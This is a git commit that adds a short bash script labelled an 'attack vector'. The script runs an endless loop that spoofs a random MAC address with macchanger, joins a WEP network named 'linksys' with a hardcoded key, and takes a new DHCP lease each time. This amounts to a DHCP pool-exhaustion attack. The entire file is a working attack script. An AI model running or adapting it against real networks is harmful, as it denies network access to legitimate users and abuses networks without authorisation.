06766dbb1702da1a218d647508ff9d480eaba3ed
sudhackar <svermaiiti@gmail.com>
2015-04-21 03:37:49 +0530

    added traditional attack vector

---
+++ dhcp_wep.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+while true; do
+   #flush the previous IP address
+   ifconfig wlan0 0.0.0.0
+
+   # kill all running dhcp clients - just in case
+   killall dhclient
+   rm -f /var/run/dhclient.pid
+
+   # bring down the interface
+   ifconfig wlan0 down
+
+   # change the MAC address of the interface and print the new MAC address
+   macchanger -a wlan0 2>&1 | grep Faked
+
+   # bring the interface up
+   ifconfig wlan0 up
+
+   #connect to the network
+   iwconfig wlan0 essid "linksys"
+
+   #adding encryption type and key
+   iwconfig wlan0 enc on
+   iwconfig wlan0 key 1234567890
+
+   # make a new DHCP lease
+   dhclient wlan0 2>&1 | grep DHCPACK
+
+   #check IP address
+   ifconfig wlan0 | grep "inet addr"
+done
